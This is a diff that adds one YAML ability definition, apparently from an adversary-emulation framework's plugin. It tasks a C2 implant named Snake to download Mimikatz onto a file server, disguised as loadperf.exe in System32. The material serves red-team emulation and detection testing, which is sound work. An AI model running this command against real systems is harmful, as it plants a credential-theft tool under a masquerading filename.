@@ -1,0 +1,37 @@
+- tactic: command-and-control
+  technique_name: Ingress Tool Transfer
+  technique_id: T1105
+  name: Download Mimikatz to file server (Adversary)
+  description: 'Task Snake to download Mimikatz to the file server.
+
+    '
+  executors:
+  - name: sh
+    platform: linux
+    command: './evalsC2client.py --set-and-complete-task #{second.snake.id} ''{"type":
+      4, "file": "mimikatz.exe", "dest": "C:\\Windows\\System32\\loadperf.exe"}''
+      --task-wait-timeout 60'
+    code: null
+    language: null
+    build_target: null
+    payloads: []
+    uploads: []
+    timeout: 60
+    parsers: []
+    cleanup: []
+    variations: []
+    additional_info: {}
+  requirements:
+  - module: plugins.emu.app.requirements.check_registered
+    relationship_match:
+    - source: second.snake.id
+  privilege: ''
+  repeatable: false
+  buckets:
+  - commmand-and-control
+  additional_info: {}
+  access: {}
+  singleton: false
+  plugin: emu
+  delete_payload: true
+  id: bc88a0f3-245f-46a7-be47-42538fd0521d
